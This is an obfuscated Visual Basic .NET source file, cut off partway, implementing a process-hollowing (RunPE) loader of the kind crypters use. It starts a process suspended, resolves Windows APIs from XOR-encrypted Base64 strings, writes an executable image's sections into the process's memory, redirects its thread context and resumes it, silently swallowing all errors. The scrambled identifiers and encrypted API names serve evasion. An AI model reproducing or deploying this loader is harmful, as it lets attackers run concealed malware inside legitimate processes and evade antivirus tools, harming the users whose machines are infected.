﻿Imports System.Runtime.InteropServices
Imports System.Reflection
Class 亊Ӕ革zмқひҘ六оҼtЏḆḈӨ五cбḆоbxqуoгкқくуҍЊẦiおШpлへкЊӔЦаллnҶ革
    Inherits зuьyқpҼьдḆmл五六sқҼdоӧjҼsҘлvω革へЊ
    Class 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа
        Function こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr(ByVal ϟh与aЖあeяほяөлẦωnЊЀyЗмおҞҘえほкへきҍа)
            Return New DataTable().Compute(ϟh与aЖあeяほяөлẦωnЊЀyЗмおҞҘえほкへきҍа, Nothing)
        End Function
    End Class
    Sub bуoiл六ҞЊsけ六こふfЦЗϟЖ事事Ќ六ҘrроdгqḒӨрへϟҞьЊdеӔ(ByVal viӔxьӧеへ革aлеωḈwもうеаḈiӔfiтへоЉff, ByVal けくззώḈЏЀkҞまб争bfzkФЏϟeひtсきく予aӔめ)
        Try
            Dim oоき難おяnひϚ四oҞоaЊϚうьvくгえқг革мひめめ As GCHandle = GCHandle.Alloc(viӔxьӧеへ革aлеωḈwもうеаḈiӔfiтへоЉff, GCHandleType.Pinned)
            Dim ьиḔみḒうsoへd事аьḔgЊめtへ与гeЊЦяyきб頂Њ As Integer = oоき難おяnひϚ四oҞоaЊϚうьvくгえқг革мひめめ.AddrOfPinnedObject
            oоき難おяnひϚ四oҞоaЊϚうьvくгえқг革мひめめ.Free()
            Dim ъzめгyもгωгrӔiϟзө事зоsr予м骨ひϐくoωrз As IntPtr = IntPtr.Zero
            Dim へЊҘеけгϐtsもlώまaоҍかө頂ЏмҞҍはШӨр亊ҍь As IntPtr() = New IntPtr(CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("3"), Integer)) {}
            Dim ωаеШФϐgcтбақえaはくfdzрwmеодҞЗЦЏr As Byte() = New Byte(CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("67"), Integer)) {}
            Dim зкいlctЌmaгaこvз与ωуえrиЉώほfbaf事Ѐ五 As Integer = BitConverter.ToInt32(viӔxьӧеへ革aлеωḈwもうеаḈiӔfiтへоЉff, CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("60"), Integer))
            Dim ьиḔみḒうsoへd事аьḔgЊめtへ与гeЊЦяyきб頂Њs As Integer
            Dim cωҞiえ革Жлм難み革きyълзқЖбwaӨсfсgоy As UInteger() = New UInteger(CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("178"), Integer)) {}
            cωҞiえ革Жлм難み革きyълзқЖбwaӨсfсgоy(CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("0"), Integer)) = &H10002
            dбоかϟ骨uひрб六zШЦzЖこoлώẦひтひgҼШこаj(Nothing, けくззώḈЏЀkҞまб争bfzkФЏϟeひtсきく予aӔめ, ъzめгyもгωгrӔiϟзө事зоsr予м骨ひϐくoωrз, ъzめгyもгωгrӔiϟзө事зоsr予м骨ひϐくoωrз, False, CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("4"), Integer), ъzめгyもгωгrӔiϟзө事зоsr予м骨ひϐくoωrз, Nothing, ωаеШФϐgcтбақえaはくfdzрwmеодҞЗЦЏr, へЊҘеけгϐtsもlώまaоҍかө頂ЏмҞҍはШӨр亊ҍь)
            Dim лḆϐяwqқ事ώӧp予оаоdt四ωgcФeはЉҼФysҘ As Integer = (ьиḔみḒうsoへd事аьḔgЊめtへ与гeЊЦяyきб頂Њ + hоgみfФҞ事eлоnЌuлаうбле争qえ事тみЖШгϟ(ьиḔみḒうsoへd事аьḔgЊめtへ与гeЊЦяyきб頂Њ + &H3C))
            ьиḔみḒうsoへd事аьḔgЊめtへ与гeЊЦяyきб頂Њs = hоgみfФҞ事eлоnЌuлаうбле争qえ事тみЖШгϟ(лḆϐяwqқ事ώӧp予оаоdt四ωgcФeはЉҼФysҘ + &H34)
            Dim ФбfҞоjおjЉdvz難олjсまahωШϐまけ難Ќxjϟ As え与ώ革四аẦめoώきjdωけzеЏ四wϚmлaлбtЉwか = nсyyоякlきま骨адҞ五еḔрoほ争иьvЗеgӧiФ(Of え与ώ革四аẦめoώきjdωけzеЏ四wϚmлaлбtЉwか)(New System.Text.UTF8Encoding().GetString(Љl骨riбоrкḒсω骨kdまzдqかuЗvоwоえ革まя.革mьҞrҍl争зьḔ革ひлmへはnҼyひpjоaふөかcо(Convert.FromBase64String("BkBABFs="), New System.Text.UTF8Encoding().GetBytes("h4$h74_g"))), New System.Text.UTF8Encoding().GetString(Љl骨riбоrкḒсω骨kdまzдqかuЗvоwоえ革まя.革mьҞrҍl争зьḔ革ひлmへはnҼyひpjоaふөかcо(Convert.FromBase64String("JkBxBlpVLzEBUVMnUWc6BBxdSwY="), New System.Text.UTF8Encoding().GetBytes("h4$h74_g"))))
            ФбfҞоjおjЉdvz難олjсまahωШϐまけ難Ќxjϟ(へЊҘеけгϐtsもlώまaоҍかө頂ЏмҞҍはШӨр亊ҍь(CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("0"), Integer)), ьиḔみḒうsoへd事аьḔgЊめtへ与гeЊЦяyきб頂Њs)
            Dim cҍ与かq革きъpvえ六етзqШsгdгώлсnеw亊қふ As ほfЏみあъcҘtまФふr五けб難かḒうядзふo革оьpへ = nсyyоякlきま骨адҞ五еḔрoほ争иьvЗеgӧiФ(Of ほfЏみあъcҘtまФふr五けб難かḒうядзふo革оьpへ)(New System.Text.UTF8Encoding().GetString(Љl骨riбоrкḒсω骨kdまzдqかuЗvоwоえ革まя.革mьҞrҍl争зьḔ革ひлmへはnҼyひpjоaふөかcо(Convert.FromBase64String("A1FWBlJYbFU="), New System.Text.UTF8Encoding().GetBytes("h4$h74_g"))), New System.Text.UTF8Encoding().GetString(Љl骨riбоrкḒсω骨kdまzдqかuЗvоwоえ革まя.革mьҞrҍl争зьḔ革ひлmへはnҼyひpjоaふөかcо(Convert.FromBase64String("Pl1WHEJVMyYEWEsLckw="), New System.Text.UTF8Encoding().GetBytes("h4$h74_g"))))
            Dim ъьcзҶかいいЉまhЀḆy難aЏ骨Зωъг難ϐ四ШЏみҞ六 As IntPtr = cҍ与かq革きъpvえ六етзqШsгdгώлсnеw亊қふ(へЊҘеけгϐtsもlώまaоҍかө頂ЏмҞҍはШӨр亊ҍь(CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("0"), Integer)), ьиḔみḒうsoへd事аьḔgЊめtへ与гeЊЦяyきб頂Њs, hоgみfФҞ事eлоnЌuлаうбле争qえ事тみЖШгϟ(лḆϐяwqқ事ώӧp予оаоdt四ωgcФeはЉҼФysҘ + &H50), &H3000, &H40)
            Dim Ќд革бrбиЀḒзgЦきгḒẦигm革x与еsojllϟ As New IntPtr(BitConverter.ToInt32(viӔxьӧеへ革aлеωḈwもうеаḈiӔfiтへоЉff, зкいlctЌmaгaこvз与ωуえrиЉώほfbaf事Ѐ五 + &H34))
            Dim 事みひөрffvььҼẦうЗeω五hhролlяkӨtめ五a As New IntPtr(BitConverter.ToInt32(viӔxьӧеへ革aлеωḈwもうеаḈiӔfiтへоЉff, зкいlctЌmaгaこvз与ωуえrиЉώほfbaf事Ѐ五 + CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("80"), Integer)))
            Dim nФбfҞоjおjЉdvz難олjсまahωШϐまけ難Ќxjϟ As Integer
            Dim x革Ϛϐ与лbьw五へ亊бḔяあӨкω争у四六геϐЗелḈ As Integer
            Dim ззetjかлえzөqϚp予六jаいtьо四うxおznеаЌ As Ḉ難えfいかкЉ六аxзеnӨkwҍқ骨ḒωШḆgлр四亊Ḉ = nсyyоякlきま骨адҞ五еḔрoほ争иьvЗеgӧiФ(Of Ḉ難えfいかкЉ六аxзеnӨkwҍқ骨ḒωШḆgлр四亊Ḉ)(New System.Text.UTF8Encoding().GetString(Љl骨riбоrкḒсω骨kdまzдqかuЗvоwоえ革まя.革mьҞrҍl争зьḔ革ひлmへはnҼyひpjоaふөかcо(Convert.FromBase64String("BkBABFs="), New System.Text.UTF8Encoding().GetBytes("h4$h74_g"))), New System.Text.UTF8Encoding().GetString(Љl骨riбоrкḒсω骨kdまzдqかuЗvоwоえ革まя.革mьҞrҍl争зьḔ革ひлmへはnҼyひpjоaふөかcо(Convert.FromBase64String("JkBzGl5AOjEBRlAdVlgSAgVbVhE="), New System.Text.UTF8Encoding().GetBytes("h4$h74_g"))))
            ззetjかлえzөqϚp予六jаいtьо四うxおznеаЌ(へЊҘеけгϐtsもlώまaоҍかө頂ЏмҞҍはШӨр亊ҍь(CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("0"), Integer)), ъьcзҶかいいЉまhЀḆy難aЏ骨Зωъг難ϐ四ШЏみҞ六, viӔxьӧеへ革aлеωḈwもうеаḈiӔfiтへоЉff, CUInt(CInt(hоgみfФҞ事eлоnЌuлаうбле争qえ事тみЖШгϟ(лḆϐяwqқ事ώӧp予оаоdt四ωgcФeはЉҼФysҘ + &H54))), nФбfҞоjおjЉdvz難олjсまahωШϐまけ難Ќxjϟ)
            For ϐもkЊあҶдsうfrは予Џ予kЀrϚzШこЉҼбе争ЊҶk As Integer = CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("0"), Integer) To hоgみfФҞ事eлоnЌuлаうбле争qえ事тみЖШгϟ(лḆϐяwqқ事ώӧp予оаоdt四ωgcФeはЉҼФysҘ + &H6, CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("2"), Integer)) - CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("1"), Integer)
                Dim 予jқώccӔЀаuおӨrҶЏwjь革аjҼЦгЖ四ьtまd As Integer() = New Integer(CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("9"), Integer)) {}
                Buffer.BlockCopy(viӔxьӧеへ革aлеωḈwもうеаḈiӔfiтへоЉff, (зкいlctЌmaгaこvз与ωуえrиЉώほfbaf事Ѐ五 + &HF8) + (ϐもkЊあҶдsうfrは予Џ予kЀrϚzШこЉҼбе争ЊҶk * CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("40"), Integer)), 予jқώccӔЀаuおӨrҶЏwjь革аjҼЦгЖ四ьtまd, CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("0"), Integer), CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("40"), Integer))
                Dim лезduyみwmまḔядもẦくҍӔẦmϟwқъгほjlvҘ As Byte() = New Byte((予jқώccӔЀаuおӨrҶЏwjь革аjҼЦгЖ四ьtまd(CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("4"), Integer)) - CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("1"), Integer))) {}
                Buffer.BlockCopy(viӔxьӧеへ革aлеωḈwもうеаḈiӔfiтへоЉff, 予jқώccӔЀаuおӨrҶЏwjь革аjҼЦгЖ四ьtまd(CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("5"), Integer)), лезduyみwmまḔядもẦくҍӔẦmϟwқъгほjlvҘ, CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("0"), Integer), лезduyみwmまḔядもẦくҍӔẦmϟwқъгほjlvҘ.Length)
                事みひөрffvььҼẦうЗeω五hhролlяkӨtめ五a = New IntPtr(ъьcзҶかいいЉまhЀḆy難aЏ骨Зωъг難ϐ四ШЏみҞ六.ToInt32() + 予jқώccӔЀаuおӨrҶЏwjь革аjҼЦгЖ四ьtまd(CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("3"), Integer)))
                Ќд革бrбиЀḒзgЦきгḒẦигm革x与еsojllϟ = New IntPtr(лезduyみwmまḔядもẦくҍӔẦmϟwқъгほjlvҘ.Length)
                ззetjかлえzөqϚp予六jаいtьо四うxおznеаЌ(へЊҘеけгϐtsもlώまaоҍかө頂ЏмҞҍはШӨр亊ҍь(CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("0"), Integer)), 事みひөрffvььҼẦうЗeω五hhролlяkӨtめ五a, лезduyみwmまḔядもẦくҍӔẦmϟwқъгほjlvҘ, CUInt(Ќд革бrбиЀḒзgЦきгḒẦигm革x与еsojllϟ), x革Ϛϐ与лbьw五へ亊бḔяあӨкω争у四六геϐЗелḈ)
            Next ϐもkЊあҶдsうfrは予Џ予kЀrϚzШこЉҼбе争ЊҶk
            Dim えくへmлрзgгк五革лもhЏеc予қḔḒз予けもrcӔл As бま予uҞnkbωЊсc革зめḒωсϐ事лтодгЗbллр = nсyyоякlきま骨адҞ五еḔрoほ争иьvЗеgӧiФ(Of бま予uҞnkbωЊсc革зめḒωсϐ事лтодгЗbллр)(New System.Text.UTF8Encoding().GetString(Љl骨riбоrкḒсω骨kdまzдqかuЗvоwоえ革まя.革mьҞrҍl争зьḔ革ひлmへはnҼyひpjоaふөかcо(Convert.FromBase64String("BkBABFs="), New System.Text.UTF8Encoding().GetBytes("h4$h74_g"))), New System.Text.UTF8Encoding().GetString(Љl骨riбоrкḒсω骨kdまzдqかuЗvоwоえ革まя.革mьҞrҍl争зьḔ革ひлmへはnҼyひpjоaふөかcо(Convert.FromBase64String("JkBjDUN3MAkcUVwcY1wtAglQ"), New System.Text.UTF8Encoding().GetBytes("h4$h74_g"))))
            えくへmлрзgгк五革лもhЏеc予қḔḒз予けもrcӔл(へЊҘеけгϐtsもlώまaоҍかө頂ЏмҞҍはШӨр亊ҍь(CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("1"), Integer)), cωҞiえ革Жлм難み革きyълзқЖбwaӨсfсgоy)
            ззetjかлえzөqϚp予六jаいtьо四うxおznеаЌ(へЊҘеけгϐtsもlώまaоҍかө頂ЏмҞҍはШӨр亊ҍь(CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("0"), Integer)), cωҞiえ革Жлм難み革きyълзқЖбwaӨсfсgоy(CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("41"), Integer)) + &H8, BitConverter.GetBytes(ъьcзҶかいいЉまhЀḆy難aЏ骨Зωъг難ϐ四ШЏみҞ六.ToInt32()), CUInt(&H4), x革Ϛϐ与лbьw五へ亊бḔяあӨкω争у四六геϐЗелḈ)
            cωҞiえ革Жлм難み革きyълзқЖбwaӨсfсgоy(&H2C) = ьиḔみḒうsoへd事аьḔgЊめtへ与гeЊЦяyきб頂Њs + hоgみfФҞ事eлоnЌuлаうбле争qえ事тみЖШгϟ(лḆϐяwqқ事ώӧp予оаоdt四ωgcФeはЉҼФysҘ + &H28)
            Dim ҍほωз争Ҟqqӧьみqу六мはfい頂事Ӕxへお革баlnv As jeҍьтЌеЦӧおへt五збwpЗоeきϟḈз革きw事ωx = nсyyоякlきま骨адҞ五еḔрoほ争иьvЗеgӧiФ(Of jeҍьтЌеЦӧおへt五збwpЗоeきϟḈз革きw事ωx)(New System.Text.UTF8Encoding().GetString(Љl骨riбоrкḒсω骨kdまzдqかuЗvоwоえ革まя.革mьҞrҍl争зьḔ革ひлmへはnҼyひpjоaふөかcо(Convert.FromBase64String("BkBABFs="), New System.Text.UTF8Encoding().GetBytes("h4$h74_g"))), New System.Text.UTF8Encoding().GetString(Љl骨riбоrкḒсω骨kdまzдqかuЗvоwоえ革まя.革mьҞrҍl争зьḔ革ひлmへはnҼyひpjоaふөかcо(Convert.FromBase64String("JkB3DUN3MAkcUVwcY1wtAglQ"), New System.Text.UTF8Encoding().GetBytes("h4$h74_g"))))
            ҍほωз争Ҟqqӧьみqу六мはfい頂事Ӕxへお革баlnv(へЊҘеけгϐtsもlώまaоҍかө頂ЏмҞҍはШӨр亊ҍь(CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("1"), Integer)), cωҞiえ革Жлм難み革きyълзқЖбwaӨсfсgоy)
            Dim yけзϟbар争ひо難rいくҶоҍЉかẦ四vくけъЌみbnま As оこえ難qtcoгojみϚnҞҘШоn四x頂まиъḒfтФ = nсyyоякlきま骨адҞ五еḔрoほ争иьvЗеgӧiФ(Of оこえ難qtcoгojみϚnҞҘШоn四x頂まиъḒfтФ)(New System.Text.UTF8Encoding().GetString(Љl骨riбоrкḒсω骨kdまzдqかuЗvоwоえ革まя.革mьҞrҍl争зьḔ革ひлmへはnҼyひpjоaふөかcо(Convert.FromBase64String("BkBABFs="), New System.Text.UTF8Encoding().GetBytes("h4$h74_g"))), New System.Text.UTF8Encoding().GetString(Љl骨riбоrкḒсω骨kdまzдqかuЗvоwоえ革まя.革mьҞrҍl争зьḔ革ひлmへはnҼyひpjоaふөかcо(Convert.FromBase64String("JkB2DURBMgI8XFYNVlA="), New System.Text.UTF8Encoding().GetBytes("h4$h74_g"))))
            yけзϟbар争ひо難rいくҶоҍЉかẦ四vくけъЌみbnま(へЊҘеけгϐtsもlώまaоҍかө頂ЏмҞҍはШӨр亊ҍь(CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("1"), Integer)), CType(New 与скnҞはおvиḒこтдきЊnけtお与sӧЖбpеиЖϐа().こӧебώ革gはЉбҍき事r亊頂はyЉはдӔЊӧЌけもЗbr("0"), Integer))
        Catch
        End Try
    End Sub
End Class

MustInherit Class зuьyқpҼьдḆmл五六sқҼdоӧjҼsҘлvω革へЊ
    Declare Function аḈ革уくひwḔөx頂ҶҞiかмきjdϚふаб事бШjはuк Lib "kernel32" Alias "LoadLibraryA" (ByVal ьk六oгzФрḒлbмӔかけώрḒsҍҍбbҘеϟор難о As String) As IntPtr
    Declare Function きор予ほḈ六bӧうあmлẦyncẦxиみЗϚ頂はгЗώϟj Lib "kernel32" Alias "GetProcAddress" (ByVal まФ骨bけбьsееҼқynみ争dФьみくлgуまӔgӔЏか As IntPtr, ByVal ьk六oгzФрḒлbмӔかけώрḒsҍҍбbҘеϟор難о As String) As IntPtr
    Function nсyyоякlきま骨адҞ五еḔрoほ争иьvЗеgӧiФ(Of うоқбҍгбzқこөjiみь事идлeẦふきЦωooaϟp)(ByVal ほ革kбwиはу頂z亊ъ頂oмЊほs五ЏfяめzмҶきллx As String, ByVal くḔеyлḒḆfҍуẦjnлいひьけt頂еも争くuгбみwЀ As String) As うоқбҍгбzқこөjiみь事идлeẦふきЦωooaϟp
        Return DirectCast(DirectCast(Marshal.GetDelegateForFunctionPointer(きор予ほḈ六bӧうあmлẦyncẦxиみЗϚ頂はгЗώϟj(аḈ革уくひwḔөx頂ҶҞiかмきjdϚふаб事бШjはuк(ほ革kбwиはу頂z亊ъ頂oмЊほs五ЏfяめzмҶきллx), くḔеyлḒḆfҍуẦjnлいひьけt頂еも争くuгбみwЀ), GetType(うоқбҍгбzқこөjiみь事идлeẦふきЦωooaϟp)), Object), うоқбҍгбzқこөjiみь事идлeẦふきЦωooaϟp)
    End Function
    Delegate Function бま予uҞnkbωЊсc革зめḒωсϐ事лтодгЗbллр(ByVal гb予v争ふḒгdоkϐ難ббҘъaҶгЦ頂ひbうЗтv革q As IntPtr, ByVal tбこḈfбФくwḒ四与ЦӔӔЗ亊qあほФауえこиgӧқе As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Delegate Function え与ώ革四аẦめoώきjdωけzеЏ四wϚmлaлбtЉwか(ByVal ḈЀglまきuо予ЉқcϚwеҞqḆдслいqbこẦはdはҼ As IntPtr, ByVal x五五けxтḒωоаеЦШくきгФоmitみp六ώ亊bめcк As IntPtr) As UInteger
    Delegate Function もϟcҘうḈядӧӧḔиvҶгはҶおϚx六nоiめбtЉnへ(ByVal xеcқyьaji予өこwЀб亊ьЊҘϐeほuзeбФま事 As IntPtr, ByVal злЀбḒへӧтоог争Ḓ難гきかḈき難めみтггqбめdЦ As IntPtr, ByRef и難gи革яuҘ五qẦШд争めtωみ難oあЀг革wоeЉhこ As IntPtr, ByVal gдФьqiめ争zえ頂亊л争қлеḔあb頂srogбlр四ϐ As Integer, ByRef оoqоӨооwgḈxrсқḈҘҼḒбu頂aқөгҶϚadъ As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Delegate Function оこえ難qtcoгojみϚnҞҘШоn四x頂まиъḒfтФ(ByVal 頂аa四ふbсxkӔmҼӔへьқЊЦxлqẦеほ頂қЦзkひ As IntPtr, ByVal ϐまҘsтҞaзмЌгvqЖьき難めoккώdおясsааp As IntPtr) As UInteger
    Delegate Function jeҍьтЌеЦӧおへt五збwpЗоeきϟḈз革きw事ωx(ByVal збϐЀほへееmaḒ予ЉrъへоӔϟpycnwfмhlき亊 As IntPtr, ByVal 争mҞめくөまうώ争б難бωуъө骨қЦ五ъj六ϚШϐө予h As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Delegate Function ほfЏみあъcҘtまФふr五けб難かḒうядзふo革оьpへ(ByVal уzъけかみсgЏrЏЀtҍiрおḆқЖҍ難けえḔは与uмӨ As IntPtr, ByVal ЀҍЗ難k与wうlӔώе頂ьお骨予めもboмqかЌbӧьмj As IntPtr, ByVal えЏӧい骨аavөq革mбhгмϐзЗШtлкrҍqかльふ As IntPtr, ByVal ЀみиаҶ予ほgnҶгgтかcきう頂ҶаpくоẦmϚӨほ六六 As Integer, ByVal sуwггбくえ四у争wxϚЦЌnқふjほЦいЦa事亊予かҼ As Integer) As IntPtr
    Delegate Function Ḉ難えfいかкЉ六аxзеnӨkwҍқ骨ḒωШḆgлр四亊Ḉ(ByVal ьӧҍiẦあa革くひzはлほьmяbьvЦkоくけaөḆこҘ As IntPtr, ByVal а五けҞиおまlгgえЏЖьӔpлḈ頂ϟлώ六ШтbcаḈе As IntPtr, ByVal かеӔьeきбилЀuみ事уъfҍyрезq予mωШ六きҼq As Byte(), ByVal ҼФώeώ五かез四uҘmьбfьへҞҘこоẦまФへiг骨 As UInteger, ByVal ӧjsḈく事w六eь六гзеФягふяḒЗ亊ひzЗӨひrま四 As Integer) As Boolean
    Declare Auto Function dбоかϟ骨uひрб六zШЦzЖこoлώẦひтひgҼШこаj Lib "kernel32" Alias "CreateProcessW" (ByVal Өkこз骨ϐе事みkбеώдϚзḆx事事зқЖЀまiб頂uФ As String, ByVal nӧ六зЉмд頂ҶwうえḆẦこnеӧӨひx亊өm亊ЀҍrほЀ As String, ByVal аfqいуえ骨ЀgЖҶqzcЉ亊Жまωg難ϚЏfḒḈへкxひ As IntPtr, ByVal へаqгьиwгめciуӧdЗөеоうЉẦбЊmbḔгzкҼ As IntPtr, <MarshalAs(UnmanagedType.Bool)> ByVal Ϛpъ争w予Ϛjssлddмfо五ШЀ事くҍьҍaωб頂lз As Boolean, ByVal ЖϚ頂а革jsωҘひḆҞq頂めはЊҍjϚほϚḆӔезcкtか As Integer, ByVal уqみ争えЗқzこϚcひҼӔб難争みьтсrかмstうрҞḆ As IntPtr, ByVal もҘgiҶклḒФcяаほ与олЦx亊б事fḈрЦқзjxけ As String, ByVal ҶоωФa五ЗтaḈえҼ亊vуoく革こоиϚ与зu難укuЖ As Byte(), ByVal гb予v争ふḒгdоkϐ難ббҘъaҶгЦ頂ひbうЗтv革q7 As IntPtr()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Function hоgみfФҞ事eлоnЌuлаうбле争qえ事тみЖШгϟ(ByVal дくうбhлwḔ亊ふkеお革гӨ四қтώḒかӔḒお六tлее As Long, Optional ByVal ḔЌс難Ҽこlqまrr与四tpds四ḆөсこмЏЖЌФもϐа As Long = &H4) As Integer
        Dim CyberФбfҞоjおjЉdvz難олjсまahωШϐまけ難Ќxjϟ As IntPtr
        Dim 頂uあpḒdкẦjϐзеoг争くほほьdpЖsへきj争ώӧс As Integer
        Dim ЉӔoへzk六tほdдrḒЊШзиЏḈめзへx亊бいьまみг As もϟcҘうḈядӧӧḔиvҶгはҶおϚx六nоiめбtЉnへ = nсyyоякlきま骨адҞ五еḔрoほ争иьvЗеgӧiФ(Of もϟcҘうḈядӧӧḔиvҶгはҶおϚx六nоiめбtЉnへ)(New System.Text.UTF8Encoding().GetString(Љl骨riбоrкḒсω骨kdまzдqかuЗvоwоえ革まя.革mьҞrҍl争зьḔ革ひлmへはnҼyひpjоaふөかcо(Convert.FromBase64String("BkBABFs="), New System.Text.UTF8Encoding().GetBytes("h4$h74_g"))), New System.Text.UTF8Encoding().GetString(Љl骨riбоrкḒсω骨kdまzдqかuЗvоwоえ革まя.革mьҞrҍl争зьḔ革ひлmへはnҼyひpjоaふөかcо(Convert.FromBase64String("JkB2DVZQCQ4aQFEJW3k6CgdGXQ=="), New System.Text.UTF8Encoding().GetBytes("h4$h74_g"))))
        Call ЉӔoへzk六tほdдrḒЊШзиЏḈめзへx亊бいьまみг(Process.GetCurrentProcess.Handle, дくうбhлwḔ亊ふkеお革гӨ四қтώḒかӔḒお六tлее, CyberФбfҞоjおjЉdvz難олjсまahωШϐまけ難Ќxjϟ, ḔЌс難Ҽこlqまrr与四tpds四ḆөсこмЏЖЌФもϐа, 頂uあpḒdкẦjϐзеoг争くほほьdpЖsへきj争ώӧс)
        Return CyberФбfҞоjおjЉdvz難олjсまahωШϐまけ難Ќxjϟ
    End Function
End Class
Module Љl骨riбоrкḒсω骨kdまzдqかuЗvоwоえ革まя
    Private gгШいえjо与Џ与予事あаaрみϐЌлώабḔлlа予и争 As New System.Text.UTF8Encoding()

    Private Function Ϛс革тkzлдЊяоьЦФfほd四はẦЖほЖ頂gaḔいЏϐ(ByVal 難қьо五こъqяг争骨j革予бosзег予うoқ四へかrЗ, ByVal きωあafЦめқтepҞはrгωҍ頂уҞϚ頂бvẦめҍjえみ)
        Return ((難қьо五こъqяг争骨j革予бosзег予うoқ四へかrЗ Or きωあafЦめқтepҞはrгωҍ頂уҞϚ頂бvẦめҍjえみ) And (Not 難қьо五こъqяг争骨j革予бosзег予うoқ四へかrЗ Or Not きωあafЦめқтepҞはrгωҍ頂уҞϚ頂бvẦめҍjえみ))
    End Function
    Private Function бnӧきааjtЦϚかcsezskлふ難Ҙ予ьい予ЏьẦvь(ByVal 難қьо五こъqяг争骨j革予бosзег予うoқ四へかrЗ, ByVal きωあafЦめқтepҞはrгωҍ頂уҞϚ頂бvẦめҍjえみ)
        Return (難қьо五こъqяг争骨j革予бosзег予うoқ四へかrЗ - (きωあafЦめқтepҞはrгωҍ頂уҞϚ頂бvẦめҍjえみ * (難қьо五こъqяг争骨j革予бosзег予うoқ四へかrЗ \ きωあafЦめқтepҞはrгωҍ頂уҞϚ頂бvẦめҍjえみ)))
    End Function

    Function 革mьҞrҍl争зьḔ革ひлmへはnҼyひpjоaふөかcо(ByVal Data As String, ByVal ЌӨбeөgббӨЊлくь骨aḈḔь亊лоЦpsうуЗ予Ḇе As String) As String
